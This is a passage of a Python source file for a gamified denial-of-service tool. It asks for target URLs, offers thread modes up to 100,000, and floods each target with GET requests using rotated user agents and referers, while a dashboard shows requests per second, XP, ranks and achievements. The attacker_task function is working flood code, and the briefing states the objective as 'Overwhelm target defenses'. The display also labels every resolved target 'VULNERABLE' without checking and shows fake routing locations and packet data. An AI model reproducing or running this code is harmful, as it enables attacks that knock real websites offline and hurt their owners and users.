        "              ║       ░░░░░░░░░░░░░░░░░░░░░░          ║",
        "              ║          ░░░░░░░░░░░░░░░░             ║",
        "              ║                                       ║",
        "              ╚═══════════════════════════════════════╝",
    ]
    
    for line in radar_art:
        console.print(f"[white]{line}[/white]")
    await asyncio.sleep(0.3)
    console.print()
    
    # Target input with enhanced prompt
    target_info = Table.grid(padding=(0, 2))
    target_info.add_column(style="bright_white", width=20)
    target_info.add_column(style="white", width=60)
    target_info.add_row("TARGET URL(S):", "")
    target_info.add_row("", "[white](Separate multiple targets with commas)[/white]")
    
    console.print(Panel(
        target_info,
        title="[bright_white]═══ INPUT REQUIRED ═══[/bright_white]",
        border_style="white",
        padding=(1, 2)
    ))
    console.print()
    
    console.print("[bright_white]>>>[/bright_white] ", end="")
    target_input = Prompt.ask("[white]Enter target URL(s)[/white]")
    
    # Parse multi-target
    targets = [url.strip() for url in target_input.split(',')]
    multi_target = len(targets) > 1
    
    console.print()
    
    # Analyzing targets with animation
    with Progress(
        SpinnerColumn(style="bright_white"),
        TextColumn("[white]Analyzing target(s)...", style="white"),
        transient=True
    ) as progress:
        task = progress.add_task("", total=None)
        await asyncio.sleep(0.8)
    
    console.print()
    
    if multi_target:
        multi_banner = Text(f">>> MULTI-TARGET MODE: {len(targets)} TARGETS DETECTED <<<", style="bright_white bold", justify="center")
        console.print(multi_banner)
        console.print()
        await asyncio.sleep(0.3)
    
    # Target analysis panel
    analysis_grid = Table.grid(padding=(0, 2))
    analysis_grid.add_column(style="white", width=20)
    analysis_grid.add_column(style="bright_white", width=50)
    
    # Try to resolve IPs and show analysis
    for idx, target_url in enumerate(targets[:3], 1):  # Show first 3
        try:
            parsed = urllib.parse.urlparse(target_url)
            hostname = parsed.hostname
            if hostname:
                ip = socket.gethostbyname(hostname)
                analysis_grid.add_row(f"TARGET {idx}:", hostname)
                analysis_grid.add_row("IP ADDRESS:", ip)
                analysis_grid.add_row("STATUS:", "████████████████░░░░ VULNERABLE")
                if idx < len(targets[:3]):
                    analysis_grid.add_row("", "")
        except:
            analysis_grid.add_row(f"TARGET {idx}:", target_url)
            analysis_grid.add_row("STATUS:", "Unable to resolve")
            if idx < len(targets[:3]):
                analysis_grid.add_row("", "")
    
    if len(targets) > 3:
        analysis_grid.add_row("", f"[white]... and {len(targets) - 3} more targets[/white]")
    
    analysis_panel = Panel(
        analysis_grid,
        title="[bright_white]═══ TARGET ANALYSIS ═══[/bright_white]",
        border_style="white",
        padding=(1, 2)
    )
    console.print(analysis_panel)
    console.print()
    
    # Clean separator
    separator = "".join(['═'] * 70)
    console.print(f"[white]{separator}[/white]", justify="center")
    console.print()
    
    # ═══════════════════════════════════════════════════════════════
    # STAGE 3: ATTACK MODE SELECTION WITH VISUAL POWER BARS
    # ═══════════════════════════════════════════════════════════════
    
    await glitch_title("[ ATTACK MODE SELECTION ]", 0.3)
    console.print()
    
    # Mode selection table with power visualization
    mode_table = Table(show_header=False, box=box.ROUNDED, border_style="white", padding=(0, 1))
    mode_table.add_column(style="bright_white", width=5, justify="center")
    mode_table.add_column(style="white", width=15)
    mode_table.add_column(style="white", width=25)
    mode_table.add_column(style="white", width=20)
    
    mode_table.add_row("[1]", "STEALTH", "░░░░░░░░░░ 500 threads", "Low Detection")
    mode_table.add_row("[2]", "NORMAL", "████████░░ 2,000 threads", "Balanced")
    mode_table.add_row("[3]", "AGGRESSIVE", "████████████ 3,500 threads", "High Power")
    mode_table.add_row("[4]", "TSUNAMI", "██████████████ 5,000 threads", "Maximum")
    mode_table.add_row("[5]", "ULTRA", "████████████████████ 75,000", "ULTRA POWER")
    mode_table.add_row("[6]", "APOCALYPSE", "██████████████████████████", "MAX POWER")
    mode_table.add_row("[C]", "CUSTOM", "Enter your own count", "")
    
    mode_panel = Panel(
        mode_table,
        title="[bright_white]═══ AVAILABLE MODES ═══[/bright_white]",
        subtitle="[white]Secret: matrix, nuke, ghost, chaos, infinity[/white]",
        border_style="bright_white",
        padding=(1, 2)
    )
    console.print(mode_panel)
    console.print()
    
    console.print("[bright_white]>>>[/bright_white] ", end="")
    mode_input = Prompt.ask("[white]Select mode or thread count[/white]", default="normal")
    
    console.print()
    
    # Process mode selection with animations
    mode = "normal"
    threads = 2000
    mode_name = "NORMAL"
    
    # Check for secret commands
    if mode_input.lower() == "matrix":
        console.print("[bright_white]>>> MATRIX MODE ACTIVATED <<<[/bright_white]", justify="center")
        console.print("[white]Reality is an illusion...[/white]", justify="center")
        await show_matrix_rain(1.0)
        mode = "god"
        threads = 10000
        mode_name = "MATRIX"
    elif mode_input.lower() == "nuke" or mode_input.lower() == "nuclear":
        console.print("[bright_white]>>> NUCLEAR OPTION ACTIVATED <<<[/bright_white]", justify="center")
        console.print("[white]Total annihilation mode engaged...[/white]", justify="center")
        await asyncio.sleep(0.5)
        mode = "nuke"
        threads = 50000
        mode_name = "NUCLEAR"
    elif mode_input.lower() == "ghost":
        console.print("[bright_white]>>> GHOST MODE ACTIVATED <<<[/bright_white]", justify="center")
        console.print("[white]Invisible and undetectable...[/white]", justify="center")
        await asyncio.sleep(0.5)
        mode = "ghost"
        threads = 100
        mode_name = "GHOST"
    elif mode_input.lower() == "chaos":
        console.print("[bright_white]>>> CHAOS MODE ACTIVATED <<<[/bright_white]", justify="center")
        console.print("[white]Randomizing everything...[/white]", justify="center")
        await asyncio.sleep(0.5)
        mode = "god"
        threads = random.randint(5000, 15000)
        mode_name = "CHAOS"
    elif mode_input.lower() == "ultra" or mode_input == "5":
        console.print("[bright_white]>>> ULTRA MODE ACTIVATED <<<[/bright_white]", justify="center")
        console.print("[white]75,000 threads of pure destruction...[/white]", justify="center")
        await asyncio.sleep(0.5)
        mode = "ultra"
        threads = ULTRA_MODE_THREADS
        mode_name = "ULTRA"
        apply_buff("haste")
    elif mode_input.lower() == "apocalypse" or mode_input == "6":
        console.print("[bright_white]>>> APOCALYPSE MODE ACTIVATED <<<[/bright_white]", justify="center")
        console.print("[white]100,000 threads - THE END IS HERE...[/white]", justify="center")
        await show_explosion("large")
        await asyncio.sleep(0.5)
        mode = "apocalypse"
        threads = APOCALYPSE_MODE_THREADS
        mode_name = "APOCALYPSE"
        apply_buff("godmode")
    elif mode_input.lower() == "infinity":
        console.print("[bright_white]>>> INFINITY MODE ACTIVATED <<<[/bright_white]", justify="center")
        console.print("[white]Endless scaling power...[/white]", justify="center")
        INFINITY_MODE["enabled"] = True
        await asyncio.sleep(0.5)
        mode = "god"
        threads = 10000
        mode_name = "INFINITY"
    elif mode_input.lower() == "god mode" or mode_input.lower() == "god":
        console.print("[bright_white]>>> GOD MODE ACTIVATED <<<[/bright_white]", justify="center")
        await asyncio.sleep(0.5)
        mode = "god"
        threads = 10000
        mode_name = "GOD"
    elif mode_input == "1" or mode_input.lower() == "stealth":
        mode = "stealth"
        threads = 500
        mode_name = "STEALTH"
    elif mode_input == "2" or mode_input.lower() == "normal":
        mode = "normal"
        threads = 2000
        mode_name = "NORMAL"
    elif mode_input == "3" or mode_input.lower() == "aggressive":
        mode = "aggressive"
        threads = 3500
        mode_name = "AGGRESSIVE"
    elif mode_input == "4" or mode_input.lower() == "tsunami":
        mode = "tsunami"
        threads = 5000
        mode_name = "TSUNAMI"
    elif mode_input.lower() in ATTACK_MODES:
        mode = mode_input.lower()
        threads = ATTACK_MODES[mode]["threads"]
        mode_name = ATTACK_MODES[mode]['name']
    else:
        # Custom thread count
        try:
            threads = int(mode_input)
            if threads < 1:
                threads = 2000
            elif threads > 100000:
                threads = 100000
            mode = "custom"
            mode_name = "CUSTOM"
        except:
            threads = 2000
            mode = "normal"
            mode_name = "NORMAL"
    
    console.print()
    
    # Mode confirmation with power display
    power_data = calculate_total_power()
    power_multiplier = power_data["total_multiplier"]
    estimated_rps = int(threads * power_multiplier * 1.2)
    
    power_grid = Table.grid(padding=(0, 2))
    power_grid.add_column(style="white", width=25)
    power_grid.add_column(style="bright_white", width=40)
    
    power_grid.add_row("MODE:", mode_name)
    power_grid.add_row("THREADS:", f"{threads:,}")
    power_grid.add_row("POWER MULTIPLIER:", f"{power_multiplier:,.0f}x")
    power_grid.add_row("ESTIMATED RPS:", f"{estimated_rps:,}+")
    
    if session_stats["active_buffs"]:
        buffs_text = ", ".join([f"{b.upper()}" for b in session_stats["active_buffs"]])
        power_grid.add_row("ACTIVE BUFFS:", buffs_text)
    
    power_panel = Panel(
        power_grid,
        title=f"[bright_white]⚡ {mode_name} MODE CONFIRMED ⚡[/bright_white]",
        border_style="bright_white",
        padding=(1, 2)
    )
    console.print(power_panel)
    console.print()
    
    # Clean separator
    separator = "".join(['═'] * 70)
    console.print(f"[white]{separator}[/white]", justify="center")
    console.print()
    
    # ═══════════════════════════════════════════════════════════════
    # STAGE 4: MISSION DURATION
    # ═══════════════════════════════════════════════════════════════
    
    await glitch_title("[ MISSION DURATION ]", 0.3)
    console.print()
    
    duration_grid = Table.grid(padding=(0, 2))
    duration_grid.add_column(style="white", width=25)
    duration_grid.add_column(style="white", width=40)
    
    duration_grid.add_row("RECOMMENDED:", "60 seconds")
    duration_grid.add_row("MAXIMUM:", "3600 seconds (1 hour)")
    
    duration_panel = Panel(
        duration_grid,
        title="[bright_white]═══ TIME CONFIGURATION ═══[/bright_white]",
        border_style="white",
        padding=(1, 2)
    )
    console.print(duration_panel)
    console.print()
    
    console.print("[bright_white]>>>[/bright_white] ", end="")
    duration = Prompt.ask("[white]Duration (seconds)[/white]", default="60")
    try:
        duration = int(duration)
        if duration < 1:
            duration = 60
        elif duration > 3600:
            duration = 3600
    except:
        duration = 60
    
    console.print()
    
    # Clean separator
    separator = "".join(['═'] * 70)
    console.print(f"[white]{separator}[/white]", justify="center")
    console.print()
    
    # ═══════════════════════════════════════════════════════════════
    # STAGE 5: MISSION BRIEFING SUMMARY
    # ═══════════════════════════════════════════════════════════════
    
    await glitch_title("[ MISSION BRIEFING ]", 0.3)
    console.print()
    
    # Create comprehensive mission briefing
    briefing_table = Table.grid(padding=(0, 2))
    briefing_table.add_column(style="white", width=20)
    briefing_table.add_column(style="bright_white", width=50)
    
    # Target info
    if multi_target:
        briefing_table.add_row("TARGETS:", f"{len(targets)} targets")
        briefing_table.add_row("PRIMARY:", targets[0][:45])
    else:
        briefing_table.add_row("TARGET:", targets[0][:45])
        try:
            parsed = urllib.parse.urlparse(targets[0])
            if parsed.hostname:
                ip = socket.gethostbyname(parsed.hostname)
                briefing_table.add_row("IP ADDRESS:", ip)
        except:
            pass
    
    briefing_table.add_row("", "")
    briefing_table.add_row("MODE:", mode_name)
    briefing_table.add_row("THREADS:", f"{threads:,}")
    briefing_table.add_row("DURATION:", f"{duration} seconds")
    briefing_table.add_row("POWER:", f"{power_multiplier:,.0f}x multiplier")
    briefing_table.add_row("EST. RPS:", f"{estimated_rps:,}+")
    
    if session_stats["active_buffs"]:
        buffs_text = ", ".join([f"{b.upper()}" for b in session_stats["active_buffs"]])
        briefing_table.add_row("BUFFS:", buffs_text)
    
    briefing_table.add_row("", "")
    briefing_table.add_row("OBJECTIVE:", "Overwhelm target defenses")
    briefing_table.add_row("SUCCESS:", ">80% request success rate")
    
    final_briefing = Panel(
        briefing_table,
        title="[bright_white]═══ MISSION PARAMETERS ═══[/bright_white]",
        border_style="bright_white",
        padding=(1, 2)
    )
    console.print(final_briefing)
    console.print()
    
    # ═══════════════════════════════════════════════════════════════
    # STAGE 6: COUNTDOWN TO LAUNCH
    # ═══════════════════════════════════════════════════════════════
    
    console.print("[white]Preparing for launch...[/white]", justify="center")
    console.print()
    
    # Countdown bar
    with Progress(
        TextColumn("[white]COUNTDOWN TO LAUNCH"),
        BarColumn(complete_style="bright_white", finished_style="bright_white", bar_width=40),
        TextColumn("[bright_white]{task.percentage:>3.0f}%"),
        transient=True
    ) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            progress.update(task, advance=1)
            await asyncio.sleep(0.003)  # 3x faster!
    
    console.print()
    
    # Final countdown
    for count in [3, 2, 1]:
        console.print(f"[bright_white]{count}...[/bright_white]", justify="center")
        await asyncio.sleep(0.4)
    
    console.print()
    
    # LAUNCH banner
    launch_text = Text("LAUNCH", style="bright_white bold", justify="center")
    launch_panel = Panel(
        Align.center(launch_text, vertical="middle"),
        border_style="bright_white",
        padding=(1, 0),
        height=5
    )
    console.print(launch_panel)
    await asyncio.sleep(0.5)
    
    console.print()
    console.print("[white]✓ Mission configuration complete[/white]", justify="center")
    console.print()
    
    return {
        "target_url": targets[0] if not multi_target else target_input,
        "targets": targets,
        "multi_target": multi_target,
        "threads": threads,
        "duration": duration,
        "mode": mode,
    }

async def attacker_task(
    target_url: str,
    session: aiohttp.ClientSession,
    stats: dict,
    error_counts: Dict[str, int],
    stop_event: asyncio.Event,
    max_requests: int,
    pattern: str = "steady",
    power_data: dict = None
):
    """Attack task - sends requests with power calculations"""
    local_count = 0
    retry_count = 0
    max_retries = 3
    
    if power_data is None:
        power_data = calculate_total_power()
    
    while not stop_event.is_set() and local_count < max_requests:
        # Update buffs
        update_buffs()
        
        # Apply attack pattern timing
        if pattern == "slow":
            delay = max(0, 0.1 - (local_count / 1000))
            await asyncio.sleep(delay)
        elif pattern == "burst":
            if local_count % 10 == 0:
                await asyncio.sleep(0.5)
        elif pattern == "wave":
            import math
            delay = abs(math.sin(local_count / 50)) * 0.1
            await asyncio.sleep(delay)
        elif pattern == "chaos":
            if random.random() < 0.1:
                await asyncio.sleep(random.uniform(0, 0.2))
        
        # Roll for critical hit
        is_crit = roll_critical_hit(power_data)
        
        # Calculate damage
        damage = calculate_damage_per_request(power_data, is_crit)
        
        # Track crits
        if is_crit:
            DETAILED_STATS["total_crits"] += 1
            stats["crits"] = stats.get("crits", 0) + 1
        
        # Track damage
        DETAILED_STATS["total_damage_dealt"] += damage
        stats["total_damage"] = stats.get("total_damage", 0) + damage
        
        headers = {
            "User-Agent": random.choice(EXTENDED_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": random.choice(REFERERS),
        }
        
        request_size = len(target_url) + sum(len(k) + len(v) for k, v in headers.items()) + 50
        
        success = False
        for attempt in range(max_retries):
            try:
                req_start = time.time()
                async with session.request(
                    "GET",
                    target_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10, connect=5),
                    ssl=False,
                    allow_redirects=True
                ) as resp:
                    await resp.read()
                    response_time = time.time() - req_start
                    
                    # Track response time
                    if len(stats["response_times"]) < 100:
                        stats["response_times"].append(response_time)
                    else:
                        stats["response_times"].pop(0)
                        stats["response_times"].append(response_time)
                    
                    if resp.status < 400:
                        stats["success"] += 1
                        success = True
                        
                        # Increment combo
                        session_stats["current_combo"] = session_stats.get("current_combo", 0) + 1
                        if session_stats["current_combo"] > DETAILED_STATS["highest_combo"]:
                            DETAILED_STATS["highest_combo"] = session_stats["current_combo"]
                    else:
                        stats["fail"] += 1
                        error_counts[f"Status {resp.status}"] = error_counts.get(f"Status {resp.status}", 0) + 1
                        # Break combo
                        session_stats["current_combo"] = 0
                    break
            
            except asyncio.TimeoutError:
                if attempt < max_retries - 1:
                    retry_count += 1
                    await asyncio.sleep(0.1)
                    continue
                stats["fail"] += 1
                error_counts["Timeout"] = error_counts.get("Timeout", 0) + 1
                session_stats["current_combo"] = 0
            except Exception as e:
                if attempt < max_retries - 1:
                    retry_count += 1
                    await asyncio.sleep(0.1)
                    continue
                stats["fail"] += 1
                error_counts[type(e).__name__] = error_counts.get(type(e).__name__, 0) + 1
                session_stats["current_combo"] = 0
        
        stats["total"] += 1
        stats["bytes_sent"] += request_size
        local_count += 1
        
        # Gain weapon mastery
        current_weapon = session_stats["equipment"]["weapon"]
        weapon_type = current_weapon.split("_")[0] if "_" in current_weapon else current_weapon
        gain_weapon_mastery(weapon_type, 1)
        
        # Increment berserker stacks on success
        global BERSERKER_STACKS
        if success and BERSERKER_STACKS < BERSERKER_MAX_STACKS:
            BERSERKER_STACKS += 1
        
        await asyncio.sleep(0)

async def live_dashboard(stats, error_counts, stop_event, target_url):
    """Live updating dashboard with MAXIMUM features + visualizations"""
    global stop_requested
    
    with Live(console=console, refresh_per_second=10) as live:
        start_time = time.time()
        wave_count = 1
        last_wave_time = start_time
        last_message_time = start_time
        last_location_time = start_time
        last_notification_time = start_time
        message_index = 0
        location_index = 0
        notification_index = 0
        rps_history = []
        success_history = []
        combo_counter = 0
        max_combo = 0
        last_achievement = 0
        peak_rps = 0
        
        while not stop_event.is_set() and not stop_requested:
            elapsed = time.time() - start_time
            rps = stats["total"] / elapsed if elapsed > 0 else 0
            mb_sent = stats["bytes_sent"] / (1024 * 1024)
            success_rate = (stats["success"] / max(stats["total"], 1)) * 100
            
            # Track RPS history for graph
            rps_history.append(rps)
            if len(rps_history) > 40:
                rps_history.pop(0)
            
            # Track success rate history
            success_history.append(success_rate)
            if len(success_history) > 20:
                success_history.pop(0)
            
            # Track peak RPS
            if rps > peak_rps:
                peak_rps = rps
            
            # Wave counter (every 10 seconds)
            if elapsed - last_wave_time >= 10:
                wave_count += 1
                last_wave_time = elapsed
            
            # Combo counter
            if stats["success"] > 0:
                combo_counter += 1
                if combo_counter > max_combo:
                    max_combo = combo_counter
            else:
                combo_counter = 0
            
            # Check for achievements
            achievement_msg = ""
            for milestone, name in ACHIEVEMENTS.items():
                if stats["total"] >= milestone and last_achievement < milestone:
                    achievement_msg = f">>> {name} <<<"
                    last_achievement = milestone
            
            # Threat level
            threat_level, threat_color = get_threat_level(rps)
            
            # Efficiency score
            efficiency = get_efficiency_score(stats)
            efficiency_gauge = create_gauge(efficiency)
            
            # XP and Level display
            current_level = session_stats["level"]
            current_xp = session_stats["xp"]
            xp_bar = create_xp_bar(current_xp, current_level, 25)
            
            # Get current rank and title
            current_rank = session_stats["rank"]
            current_title = session_stats["title"]
            for xp_threshold, rank_info in sorted(RANKS.items(), reverse=True):
                if session_stats["xp"] >= xp_threshold:
                    current_rank = rank_info["name"]
                    current_title = rank_info["title"]
                    session_stats["rank"] = current_rank
                    session_stats["title"] = current_title
                    break
            
            # Stats table with enhanced visuals
            stats_table = Table.grid(expand=True)
            stats_table.add_column(justify="left", style="bold white")
            stats_table.add_column(justify="right", style="white")
            
            stats_table.add_row("TARGET", target_url[:50])
            stats_table.add_row("WAVE", f"#{wave_count}")
            stats_table.add_row("RANK", f"{current_rank}")
            stats_table.add_row("TITLE", f"{current_title}")
            stats_table.add_row("LEVEL", f"{current_level}")
            stats_table.add_row("TIMESTAMP", datetime.now().strftime("%H:%M:%S.%f")[:-3])
            stats_table.add_row("UPTIME", f"{int(elapsed//60)}m {int(elapsed%60)}s")
            stats_table.add_row("", "")
            stats_table.add_row("TOTAL REQUESTS", f"{stats['total']:,}")
            stats_table.add_row("SUCCESSFUL", f"{stats['success']:,}")
            stats_table.add_row("FAILED", f"{stats['fail']:,}")
            stats_table.add_row("", "")
            stats_table.add_row("REQUESTS/SEC", f"{rps:.0f}")
            stats_table.add_row("PEAK RPS", f"{peak_rps:.0f}")
            stats_table.add_row("THREAT LEVEL", f"[{threat_color}]{threat_level}[/{threat_color}]")
            stats_table.add_row("EFFICIENCY", f"{efficiency_gauge} {efficiency}%")
            stats_table.add_row("DATA SENT", f"{mb_sent:.2f} MB")
            
            # RPS Graph
            graph = create_rps_graph(rps_history, width=40, height=6)
            graph_panel = Panel(
                f"{graph}",
                title="╣ RPS GRAPH ╠",
                border_style="white"
            )
            
            # Success rate sparkline
            sparkline = create_sparkline(success_history, 40)
            sparkline_panel = Panel(
                f"{sparkline}\nSuccess Rate: {success_rate:.1f}%",
                title="╣ SUCCESS TREND ╠",
                border_style="white"
            )
            
            # System metrics with progress bars
            cpu = psutil.cpu_percent(interval=0.1)
            mem = psutil.virtual_memory().percent
            net = psutil.net_io_counters().bytes_sent / (1024 * 1024)
            
            sys_table = Table.grid(expand=True)
            sys_table.add_column(justify="left", style="bold white", width=15)
            sys_table.add_column(justify="left", style="dim white")
            
            cpu_bar = create_progress_bar(cpu, 100, 25)
            mem_bar = create_progress_bar(mem, 100, 25)
            
            sys_table.add_row("CPU", f"{cpu_bar} {cpu:.1f}%")
            sys_table.add_row("MEMORY", f"{mem_bar} {mem:.1f}%")
            sys_table.add_row("NETWORK", f"{net:.2f} MB")
            sys_table.add_row("XP", f"{xp_bar}")
            
            # Attack info table
            attack_table = Table.grid(expand=True)
            attack_table.add_column(justify="left", style="white")
            
            # Random connection indicators
            indicators = ['◉', '◎', '●', '○']
            status_line = ' '.join([random.choice(indicators) for _ in range(20)])
            attack_table.add_row(f"{status_line}")
            
            # Rotating hacking messages
            if elapsed - last_message_time >= 2:
                message_index = (message_index + 1) % len(HACKING_MESSAGES)
                last_message_time = elapsed
            
            attack_table.add_row(f"> {HACKING_MESSAGES[message_index]}")
            
            # Rotating fake location
            if elapsed - last_location_time >= 3:
                location_index = (location_index + 1) % len(FAKE_LOCATIONS)
                last_location_time = elapsed
            
            attack_table.add_row(f"> Routing through: {FAKE_LOCATIONS[location_index]}")
            
            # Rotating notifications
            if elapsed - last_notification_time >= 4:
                notification_index = (notification_index + 1) % len(NOTIFICATIONS)
                last_notification_time = elapsed
            
            attack_table.add_row(f"> {NOTIFICATIONS[notification_index]}")
            
            # Combo counter
            if combo_counter > 10:
                attack_table.add_row(f"COMBO: {combo_counter}x")
            
            # Achievement notification
            if achievement_msg:
                attack_table.add_row(f"{achievement_msg}")
            
            # Error table
            error_table = Table.grid(expand=True)
            error_table.add_column(justify="left", style="dim white")
            error_table.add_column(justify="right", style="white")
            
            if error_counts:
                for err, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
                    error_table.add_row(err, f"{count:,}")
            else:
                error_table.add_row("NO ERRORS", "✓")
            
            # Hexadecimal stream (fake packet data)
            hex_stream = ' '.join([f"{random.randint(0, 255):02X}" for _ in range(16)])
            
            # Protocol breakdown (fake)
            protocols = ["HTTP/1.1", "HTTP/2", "HTTPS"]
            protocol_dist = ' '.join([f"{p}:{random.randint(20,40)}%" for p in protocols])
            
            # Response time histogram
            response_histogram = create_response_time_histogram(stats.get("response_times", []), 40, 5)
            
            # Build layout with all panels
            layout = Group(
                Panel(stats_table, title="╣ ATTACK STATISTICS ╠", border_style="white"),
                graph_panel,
                sparkline_panel,
                Panel(sys_table, title="╣ SYSTEM METRICS ╠", border_style="dim white"),
                Panel(attack_table, title="╣ STATUS ╠", border_style="white"),
                Panel(error_table, title="╣ ERROR LOG ╠", border_style="white"),
                Panel(f"{response_histogram}", title="╣ RESPONSE TIME HISTOGRAM ╠", border_style="dim white"),
                Panel(f"{hex_stream}", title="╣ PACKET STREAM ╠", border_style="dim white"),
                Panel(f"{protocol_dist}", title="╣ PROTOCOL DISTRIBUTION ╠", border_style="dim white"),
            )
            
            live.update(layout)
            await asyncio.sleep(0.1)
            elapsed = time.time() - start_time
            rps = stats["total"] / elapsed if elapsed > 0 else 0
            mb_sent = stats["bytes_sent"] / (1024 * 1024)
            
            # Track RPS history for graph
            rps_history.append(rps)
            if len(rps_history) > 40:
                rps_history.pop(0)
            
            # Track peak RPS
            if rps > peak_rps:
                peak_rps = rps
            
            # Wave counter (every 10 seconds)
            if elapsed - last_wave_time >= 10:
                wave_count += 1
                last_wave_time = elapsed
            
            # Combo counter
            if stats["success"] > 0:
                combo_counter += 1
                if combo_counter > max_combo:
                    max_combo = combo_counter
            else:
                combo_counter = 0
            
            # Check for achievements
            achievement_msg = ""
            for milestone, name in ACHIEVEMENTS.items():
                if stats["total"] >= milestone and last_achievement < milestone:
                    achievement_msg = f">>> {name} <<<"
                    last_achievement = milestone
            
            # Threat level
            threat_level, threat_color = get_threat_level(rps)
            
            # Efficiency score
            efficiency = get_efficiency_score(stats)
            efficiency_gauge = create_gauge(efficiency)
            
            # Stats table with enhanced visuals
            stats_table = Table.grid(expand=True)
            stats_table.add_column(justify="left", style="bold white")
            stats_table.add_column(justify="right", style="white")
            
            stats_table.add_row("TARGET", target_url[:50])
            stats_table.add_row("WAVE", f"#{wave_count}")
            stats_table.add_row("TIMESTAMP", datetime.now().strftime("%H:%M:%S.%f")[:-3])
            stats_table.add_row("UPTIME", f"{int(elapsed//60)}m {int(elapsed%60)}s")
            stats_table.add_row("", "")
            stats_table.add_row("TOTAL REQUESTS", f"{stats['total']:,}")
            stats_table.add_row("SUCCESSFUL", f"{stats['success']:,}")
            stats_table.add_row("FAILED", f"{stats['fail']:,}")
            stats_table.add_row("", "")
            stats_table.add_row("REQUESTS/SEC", f"{rps:.0f}")
            stats_table.add_row("PEAK RPS", f"{peak_rps:.0f}")
            stats_table.add_row("THREAT LEVEL", f"[{threat_color}]{threat_level}[/{threat_color}]")
            stats_table.add_row("EFFICIENCY", f"{efficiency_gauge} {efficiency}%")
            stats_table.add_row("DATA SENT", f"{mb_sent:.2f} MB")
            
            # RPS Graph
            graph = create_rps_graph(rps_history, width=40, height=6)
            graph_panel = Panel(
                f"{graph}",
                title="╣ RPS GRAPH ╠",
                border_style="white"
            )
            
            # System metrics with progress bars
            cpu = psutil.cpu_percent(interval=0.1)
            mem = psutil.virtual_memory().percent
            net = psutil.net_io_counters().bytes_sent / (1024 * 1024)
            
            sys_table = Table.grid(expand=True)
            sys_table.add_column(justify="left", style="bold white", width=15)
            sys_table.add_column(justify="left", style="dim white")
            
            cpu_bar = create_progress_bar(cpu, 100, 25)
            mem_bar = create_progress_bar(mem, 100, 25)
            
            sys_table.add_row("CPU", f"{cpu_bar} {cpu:.1f}%")
            sys_table.add_row("MEMORY", f"{mem_bar} {mem:.1f}%")
            sys_table.add_row("NETWORK", f"{net:.2f} MB")
            
            # Attack info table
            attack_table = Table.grid(expand=True)
            attack_table.add_column(justify="left", style="white")
            
            # Random connection indicators
            indicators = ['◉', '◎', '●', '○']
            status_line = ' '.join([random.choice(indicators) for _ in range(20)])
            attack_table.add_row(f"{status_line}")
            
            # Rotating hacking messages
            if elapsed - last_message_time >= 2:
                message_index = (message_index + 1) % len(HACKING_MESSAGES)
                last_message_time = elapsed
            
            attack_table.add_row(f"> {HACKING_MESSAGES[message_index]}")
            
            # Rotating fake location
            if elapsed - last_location_time >= 3:
                location_index = (location_index + 1) % len(FAKE_LOCATIONS)
                last_location_time = elapsed
            
            attack_table.add_row(f"> Routing through: {FAKE_LOCATIONS[location_index]}")
            
            # Combo counter
            if combo_counter > 10:
                attack_table.add_row(f"COMBO: {combo_counter}x")
            
            # Achievement notification
            if achievement_msg:
                attack_table.add_row(f"{achievement_msg}")
            
            # Error table
            error_table = Table.grid(expand=True)
            error_table.add_column(justify="left", style="dim white")
            error_table.add_column(justify="right", style="white")
            
            if error_counts:
                for err, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
                    error_table.add_row(err, f"{count:,}")
            else:
                error_table.add_row("NO ERRORS", "✓")
            
            # Hexadecimal stream (fake packet data)
            hex_stream = ' '.join([f"{random.randint(0, 255):02X}" for _ in range(16)])
            
            # Protocol breakdown (fake)
            protocols = ["HTTP/1.1", "HTTP/2", "HTTPS"]
            protocol_dist = ' '.join([f"{p}:{random.randint(20,40)}%" for p in protocols])
            
            # Build layout with all panels
            layout = Group(
                Panel(stats_table, title="╣ ATTACK STATISTICS ╠", border_style="white"),
                graph_panel,
                Panel(sys_table, title="╣ SYSTEM METRICS ╠", border_style="dim white"),
                Panel(attack_table, title="╣ STATUS ╠", border_style="white"),
                Panel(error_table, title="╣ ERROR LOG ╠", border_style="white"),
                Panel(f"{hex_stream}", title="╣ PACKET STREAM ╠", border_style="dim white"),
                Panel(f"{protocol_dist}", title="╣ PROTOCOL DISTRIBUTION ╠", border_style="dim white"),
            )
            
            live.update(layout)
            await asyncio.sleep(0.1)

async def main():
    """Main function with advanced menu system"""
    global stop_requested
    
    # Setup signal handler for Ctrl+Q (works on Unix-like systems)
    try:
        signal.signal(signal.SIGQUIT, signal_handler)
    except:
        pass  # Windows doesn't have SIGQUIT
    
    # Show intro only once
    await boot_sequence()
    await animated_intro()
    
    # Main menu loop
    while True:
        choice = await show_advanced_menu()
        
        if choice == "q":
            console.print()
            console.print("> Shutting down...")
            # Save session stats
            session_stats["total_playtime"] += int(time.time() - session_stats["session_start"])
            await asyncio.sleep(0.5)
            break
        
        elif choice == "2":
            await show_attack_history()
            continue
        
        elif choice == "3":
            await show_target_profiles()
            continue
        
        elif choice == "4":
            await show_skill_tree()
            continue
        
        elif choice == "5":
            await show_equipment_shop()
            continue
        
        elif choice == "6":
            # Show achievements (existing code)
            console.clear()
            console.print()
            console.print("ACHIEVEMENTS".center(70))
            console.print("" + "─" * 70 + "")
            console.print()
            
            for achievement_id, achievement in ACHIEVEMENTS_LIST.items():
                unlocked = achievement_id in session_stats["achievements_unlocked"]
                status = "✓" if unlocked else "✗"
                name_style = "white" if unlocked else "dim white"
                console.print(f"{status} [{name_style}]{achievement['name']}[/{name_style}]")
                console.print(f"   {achievement['desc']} (+{achievement['xp']} XP)")
                console.print()
            
            console.print(f"Unlocked: {len(session_stats['achievements_unlocked'])}/{len(ACHIEVEMENTS_LIST)}")
            console.print()
            input("Press ENTER to continue...")
            continue
        
        elif choice == "7":
            show_leaderboard()
            input("Press ENTER to continue...")
            continue
        
        elif choice == "8":
            await show_boss_battles()
            continue
        
        elif choice == "9":
            # Settings menu
            console.clear()
            console.print()
            console.print("SETTINGS".center(70))
            console.print("" + "─" * 70 + "")
            console.print()
            console.print(f"1. Adaptive AI: {'ON' if ADAPTIVE_AI['enabled'] else 'OFF'}")
            console.print(f"2. View Statistics")
            console.print(f"3. Clear History")
            console.print()
            input("Press ENTER to continue...")
            continue
        
        elif choice == "0":
